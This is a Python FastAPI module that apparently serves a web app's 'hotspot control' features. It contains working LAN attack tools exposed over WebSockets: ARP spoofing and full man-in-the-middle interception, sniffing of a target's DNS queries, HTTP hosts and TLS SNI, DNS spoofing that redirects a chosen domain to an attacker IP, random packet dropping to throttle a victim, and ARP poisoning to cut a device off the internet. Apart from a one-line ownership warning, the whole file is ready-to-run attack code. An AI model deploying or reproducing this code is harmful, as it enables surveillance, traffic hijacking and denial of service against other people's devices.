"""
control.py — Hotspot control features.
WARNING: Only use on networks and devices you own.
"""

from __future__ import annotations

import asyncio
import json
import logging
import subprocess
import time
from typing import Optional

from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from fastapi.websockets import WebSocketState
from pydantic import BaseModel, field_validator
from scapy.all import (
    ARP, DNS, DNSQR, DNSRR, Ether, IP, TCP, UDP, Raw,
    AsyncSniffer, conf, send, sendp, srp, sr1
)
from starlette.websockets import WebSocketDisconnect as StarletteDisconnect
import ipaddress

logger = logging.getLogger(__name__)
control_router = APIRouter(prefix="/api/control", tags=["control"])
ALLOWED_ORIGIN = "https://flipperwebapp.vercel.app"
conf.verb = 0

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_mac(ip: str) -> Optional[str]:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=2, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None


def _enable_forwarding():
    subprocess.run(
        ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
        capture_output=True
    )


def _disable_forwarding():
    subprocess.run(
        ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
        capture_output=True
    )


def _restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------

class TargetRequest(BaseModel):
    target_ip: str
    gateway_ip: str

    @field_validator("target_ip", "gateway_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str:
        try:
            ipaddress.IPv4Address(v)
        except ValueError:
            raise ValueError(f"Invalid IP: {v!r}")
        return v


class DnsRedirectRequest(BaseModel):
    target_ip: str
    gateway_ip: str
    domain: str
    redirect_ip: str

    @field_validator("target_ip", "gateway_ip", "redirect_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str:
        try:
            ipaddress.IPv4Address(v)
        except ValueError:
            raise ValueError(f"Invalid IP: {v!r}")
        return v


class ThrottleRequest(BaseModel):
    target_ip: str
    gateway_ip: str
    drop_percent: int = 70

    @field_validator("target_ip", "gateway_ip")
    @classmethod
    def validate_ip(cls, v: str) -> str:
        try:
            ipaddress.IPv4Address(v)
        except ValueError:
            raise ValueError(f"Invalid IP: {v!r}")
        return v

    @field_validator("drop_percent")
    @classmethod
    def validate_percent(cls, v: int) -> int:
        if not (1 <= v <= 99):
            raise ValueError("drop_percent must be between 1 and 99")
        return v


# ---------------------------------------------------------------------------
# Feature 1: Traffic Inspector (WebSocket)
# ---------------------------------------------------------------------------

@control_router.websocket("/ws/inspect")
async def ws_inspect(websocket: WebSocket) -> None:
    """Sniff DNS queries and HTTP/HTTPS sites from a target device."""
    origin = websocket.headers.get("origin", "")
    if origin != ALLOWED_ORIGIN:
        await websocket.close(code=1008)
        return

    await websocket.accept()

    raw = await websocket.receive_text()
    req = json.loads(raw)
    target_ip = req.get("target_ip")
    gateway_ip = req.get("gateway_ip")

    if not target_ip or not gateway_ip:
        await websocket.send_text(json.dumps({"event": "error", "message": "target_ip and gateway_ip required"}))
        await websocket.close()
        return

    await websocket.send_text(json.dumps({"event": "inspect_started", "target": target_ip}))

    loop = asyncio.get_running_loop()
    queue: asyncio.Queue = asyncio.Queue(maxsize=500)
    stop_event = asyncio.Event()

    # Start ARP spoof so traffic passes through us
    target_mac = await asyncio.to_thread(_get_mac, target_ip)
    gateway_mac = await asyncio.to_thread(_get_mac, gateway_ip)
    _enable_forwarding()

    spoof_stop = asyncio.Event()

    async def arp_spoof_loop():
        while not spoof_stop.is_set():
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
            await asyncio.sleep(2)

    spoof_task = asyncio.create_task(arp_spoof_loop())

    def packet_callback(pkt):
        if stop_event.is_set():
            return

        result = None

        # DNS query — what domain is the device looking up?
        if pkt.haslayer(DNS) and pkt.haslayer(UDP):
            if pkt[UDP].dport == 53 and pkt.haslayer(DNSQR):
                domain = pkt[DNSQR].qname
                if isinstance(domain, bytes):
                    domain = domain.decode(errors="ignore").rstrip(".")
                if pkt.haslayer(IP) and pkt[IP].src == target_ip:
                    result = {
                        "event": "traffic",
                        "type": "DNS",
                        "src": pkt[IP].src,
                        "detail": domain,
                    }

        # HTTP — extract Host header
        elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if isinstance(payload, bytes):
                try:
                    text = payload.decode(errors="ignore")
                    if text.startswith(("GET ", "POST ", "PUT ", "HEAD ")):
                        host = ""
                        for line in text.split("\r\n"):
                            if line.lower().startswith("host:"):
                                host = line.split(":", 1)[1].strip()
                                break
                        if host and pkt.haslayer(IP) and pkt[IP].src == target_ip:
                            result = {
                                "event": "traffic",
                                "type": "HTTP",
                                "src": pkt[IP].src,
                                "detail": host,
                            }
                except Exception:
                    pass

        # HTTPS SNI — extract domain from TLS ClientHello
        elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load
            if isinstance(payload, bytes) and len(payload) > 5:
                try:
                    if payload[0] == 0x16 and payload[1] == 0x03:
                        data = payload[5:]
                        idx = 0
                        while idx < len(data) - 2:
                            if data[idx] == 0x00 and data[idx+1] == 0x00:
                                sni_len = (data[idx+7] << 8) | data[idx+8]
                                sni = data[idx+9:idx+9+sni_len].decode(errors="ignore")
                                if sni and pkt.haslayer(IP) and pkt[IP].src == target_ip:
                                    result = {
                                        "event": "traffic",
                                        "type": "HTTPS",
                                        "src": pkt[IP].src,
                                        "detail": sni,
                                    }
                                break
                            idx += 1
                except Exception:
                    pass

        if result:
            loop.call_soon_threadsafe(queue.put_nowait, json.dumps(result))

    sniffer = AsyncSniffer(
        filter=f"host {target_ip}",
        prn=packet_callback,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    sniffer.start()

    try:
        while True:
            try:
                msg = await asyncio.wait_for(queue.get(), timeout=1.0)
                if websocket.client_state == WebSocketState.CONNECTED:
                    await websocket.send_text(msg)
                else:
                    break
            except asyncio.TimeoutError:
                if websocket.client_state != WebSocketState.CONNECTED:
                    break
    except (WebSocketDisconnect, StarletteDisconnect):
        pass
    finally:
        stop_event.set()
        spoof_stop.set()
        spoof_task.cancel()
        sniffer.stop()
        if target_mac and gateway_mac:
            await asyncio.to_thread(_restore_arp, target_ip, target_mac, gateway_ip, gateway_mac)
        _disable_forwarding()
        logger.info("ws/inspect: stopped")


# ---------------------------------------------------------------------------
# Feature 2: DNS Manipulator (WebSocket)
# ---------------------------------------------------------------------------

@control_router.websocket("/ws/dns-spoof")
async def ws_dns_spoof(websocket: WebSocket) -> None:
    """Intercept DNS queries from target and redirect a domain to a fake IP."""
    origin = websocket.headers.get("origin", "")
    if origin != ALLOWED_ORIGIN:
        await websocket.close(code=1008)
        return

    await websocket.accept()

    raw = await websocket.receive_text()
    req = json.loads(raw)
    target_ip = req.get("target_ip")
    gateway_ip = req.get("gateway_ip")
    domain = req.get("domain", "").lower().rstrip(".")
    redirect_ip = req.get("redirect_ip")

    await websocket.send_text(json.dumps({
        "event": "dns_spoof_started",
        "target": target_ip,
        "domain": domain,
        "redirect_to": redirect_ip,
    }))

    loop = asyncio.get_running_loop()
    queue: asyncio.Queue = asyncio.Queue(maxsize=200)
    stop_event = asyncio.Event()

    target_mac = await asyncio.to_thread(_get_mac, target_ip)
    gateway_mac = await asyncio.to_thread(_get_mac, gateway_ip)
    _enable_forwarding()

    spoof_stop = asyncio.Event()

    async def arp_spoof_loop():
        while not spoof_stop.is_set():
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
            await asyncio.sleep(2)

    spoof_task = asyncio.create_task(arp_spoof_loop())

    def packet_callback(pkt):
        if stop_event.is_set():
            return
        if not (pkt.haslayer(DNS) and pkt.haslayer(DNSQR)):
            return
        if not (pkt.haslayer(IP) and pkt[IP].src == target_ip):
            return
        if pkt[UDP].dport != 53:
            return

        queried = pkt[DNSQR].qname
        if isinstance(queried, bytes):
            queried = queried.decode(errors="ignore").rstrip(".")

        if domain in queried:
            spoofed = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=53) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=redirect_ip)
                )
            )
            send(spoofed, verbose=0)
            msg = json.dumps({
                "event": "dns_spoofed",
                "domain": queried,
                "redirected_to": redirect_ip,
                "target": target_ip,
            })
            loop.call_soon_threadsafe(queue.put_nowait, msg)

    sniffer = AsyncSniffer(
        filter=f"udp port 53 and src host {target_ip}",
        prn=packet_callback,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    sniffer.start()

    try:
        while True:
            try:
                msg = await asyncio.wait_for(queue.get(), timeout=1.0)
                if websocket.client_state == WebSocketState.CONNECTED:
                    await websocket.send_text(msg)
                else:
                    break
            except asyncio.TimeoutError:
                if websocket.client_state != WebSocketState.CONNECTED:
                    break
    except (WebSocketDisconnect, StarletteDisconnect):
        pass
    finally:
        stop_event.set()
        spoof_stop.set()
        spoof_task.cancel()
        sniffer.stop()
        if target_mac and gateway_mac:
            await asyncio.to_thread(_restore_arp, target_ip, target_mac, gateway_ip, gateway_mac)
        _disable_forwarding()
        logger.info("ws/dns-spoof: stopped")


# ---------------------------------------------------------------------------
# Feature 3: Bandwidth Throttler (WebSocket)
# ---------------------------------------------------------------------------

@control_router.websocket("/ws/throttle")
async def ws_throttle(websocket: WebSocket) -> None:
    """Throttle a device by randomly dropping a percentage of their packets."""
    origin = websocket.headers.get("origin", "")
    if origin != ALLOWED_ORIGIN:
        await websocket.close(code=1008)
        return

    await websocket.accept()

    raw = await websocket.receive_text()
    req = json.loads(raw)
    target_ip = req.get("target_ip")
    gateway_ip = req.get("gateway_ip")
    drop_percent = int(req.get("drop_percent", 70))

    await websocket.send_text(json.dumps({
        "event": "throttle_started",
        "target": target_ip,
        "drop_percent": drop_percent,
    }))

    loop = asyncio.get_running_loop()
    queue: asyncio.Queue = asyncio.Queue(maxsize=200)
    stop_event = asyncio.Event()

    target_mac = await asyncio.to_thread(_get_mac, target_ip)
    gateway_mac = await asyncio.to_thread(_get_mac, gateway_ip)
    _enable_forwarding()

    spoof_stop = asyncio.Event()
    dropped = [0]
    forwarded = [0]

    async def arp_spoof_loop():
        while not spoof_stop.is_set():
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
            await asyncio.sleep(2)

    spoof_task = asyncio.create_task(arp_spoof_loop())

    import random as _random

    def packet_callback(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(IP):
            return
        if _random.randint(1, 100) <= drop_percent:
            dropped[0] += 1
            msg = json.dumps({
                "event": "packet_dropped",
                "dropped": dropped[0],
                "forwarded": forwarded[0],
            })
            loop.call_soon_threadsafe(queue.put_nowait, msg)
        else:
            forwarded[0] += 1
            send(pkt, verbose=0)

    sniffer = AsyncSniffer(
        filter=f"host {target_ip}",
        prn=packet_callback,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    sniffer.start()

    try:
        while True:
            try:
                msg = await asyncio.wait_for(queue.get(), timeout=1.0)
                if websocket.client_state == WebSocketState.CONNECTED:
                    await websocket.send_text(msg)
                else:
                    break
            except asyncio.TimeoutError:
                if websocket.client_state != WebSocketState.CONNECTED:
                    break
    except (WebSocketDisconnect, StarletteDisconnect):
        pass
    finally:
        stop_event.set()
        spoof_stop.set()
        spoof_task.cancel()
        sniffer.stop()
        if target_mac and gateway_mac:
            await asyncio.to_thread(_restore_arp, target_ip, target_mac, gateway_ip, gateway_mac)
        _disable_forwarding()
        logger.info("ws/throttle: stopped")


# ---------------------------------------------------------------------------
# Feature 4: Internet Blocker (WebSocket)
# ---------------------------------------------------------------------------

@control_router.websocket("/ws/block")
async def ws_block(websocket: WebSocket) -> None:
    """Cut off a device from the internet using ARP poisoning without forwarding."""
    origin = websocket.headers.get("origin", "")
    if origin != ALLOWED_ORIGIN:
        await websocket.close(code=1008)
        return

    await websocket.accept()

    raw = await websocket.receive_text()
    req = json.loads(raw)
    target_ip = req.get("target_ip")
    gateway_ip = req.get("gateway_ip")

    target_mac = await asyncio.to_thread(_get_mac, target_ip)
    gateway_mac = await asyncio.to_thread(_get_mac, gateway_ip)

    if not target_mac:
        await websocket.send_text(json.dumps({"event": "error", "message": f"Could not find MAC for {target_ip}"}))
        await websocket.close()
        return

    # Disable forwarding so traffic goes nowhere
    _disable_forwarding()

    await websocket.send_text(json.dumps({
        "event": "block_started",
        "target": target_ip,
        "target_mac": target_mac,
    }))

    stop_event = asyncio.Event()

    async def arp_poison_loop():
        while not stop_event.is_set():
            # Tell target: gateway is at our MAC (traffic goes to us, then nowhere)
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
            await websocket.send_text(json.dumps({
                "event": "blocking",
                "target": target_ip,
                "status": "Internet blocked",
            }))
            await asyncio.sleep(2)

    poison_task = asyncio.create_task(arp_poison_loop())

    try:
        while websocket.client_state == WebSocketState.CONNECTED:
            await asyncio.sleep(1)
    except (WebSocketDisconnect, StarletteDisconnect):
        pass
    finally:
        stop_event.set()
        poison_task.cancel()
        # Restore ARP so device gets internet back
        if target_mac and gateway_mac:
            await asyncio.to_thread(_restore_arp, target_ip, target_mac, gateway_ip, gateway_mac)
        _enable_forwarding()
        logger.info("ws/block: stopped, ARP restored")


# ---------------------------------------------------------------------------
# Feature 5: ARP Spoofer / MITM (WebSocket)
# ---------------------------------------------------------------------------

@control_router.websocket("/ws/arp-spoof")
async def ws_arp_spoof(websocket: WebSocket) -> None:
    """Full MITM: ARP poison both target and gateway, forward all traffic."""
    origin = websocket.headers.get("origin", "")
    if origin != ALLOWED_ORIGIN:
        await websocket.close(code=1008)
        return

    await websocket.accept()

    raw = await websocket.receive_text()
    req = json.loads(raw)
    target_ip = req.get("target_ip")
    gateway_ip = req.get("gateway_ip")

    target_mac = await asyncio.to_thread(_get_mac, target_ip)
    gateway_mac = await asyncio.to_thread(_get_mac, gateway_ip)

    if not target_mac or not gateway_mac:
        await websocket.send_text(json.dumps({"event": "error", "message": "Could not resolve MACs"}))
        await websocket.close()
        return

    _enable_forwarding()

    await websocket.send_text(json.dumps({
        "event": "mitm_started",
        "target": target_ip,
        "target_mac": target_mac,
        "gateway": gateway_ip,
        "gateway_mac": gateway_mac,
        "status": "All traffic now passing through your PC",
    }))

    stop_event = asyncio.Event()
    packets_intercepted = [0]

    loop = asyncio.get_running_loop()
    queue: asyncio.Queue = asyncio.Queue(maxsize=200)

    async def arp_spoof_loop():
        while not stop_event.is_set():
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
            await asyncio.sleep(2)

    def packet_counter(pkt):
        if stop_event.is_set():
            return
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            if src == target_ip or dst == target_ip:
                packets_intercepted[0] += 1
                if packets_intercepted[0] % 10 == 0:
                    msg = json.dumps({
                        "event": "mitm_traffic",
                        "packets_intercepted": packets_intercepted[0],
                        "last_src": src,
                        "last_dst": dst,
                    })
                    loop.call_soon_threadsafe(queue.put_nowait, msg)

    spoof_task = asyncio.create_task(arp_spoof_loop())

    sniffer = AsyncSniffer(
        filter=f"host {target_ip}",
        prn=packet_counter,
        store=False,
        stop_filter=lambda _: stop_event.is_set(),
    )
    sniffer.start()

    try:
        while True:
            try:
                msg = await asyncio.wait_for(queue.get(), timeout=1.0)
                if websocket.client_state == WebSocketState.CONNECTED:
                    await websocket.send_text(msg)
                else:
                    break
            except asyncio.TimeoutError:
                if websocket.client_state != WebSocketState.CONNECTED:
                    break
    except (WebSocketDisconnect, StarletteDisconnect):
        pass
    finally:
        stop_event.set()
        spoof_task.cancel()
        sniffer.stop()
        await asyncio.to_thread(_restore_arp, target_ip, target_mac, gateway_ip, gateway_mac)
        _disable_forwarding()
        logger.info("ws/arp-spoof: stopped, ARP restored")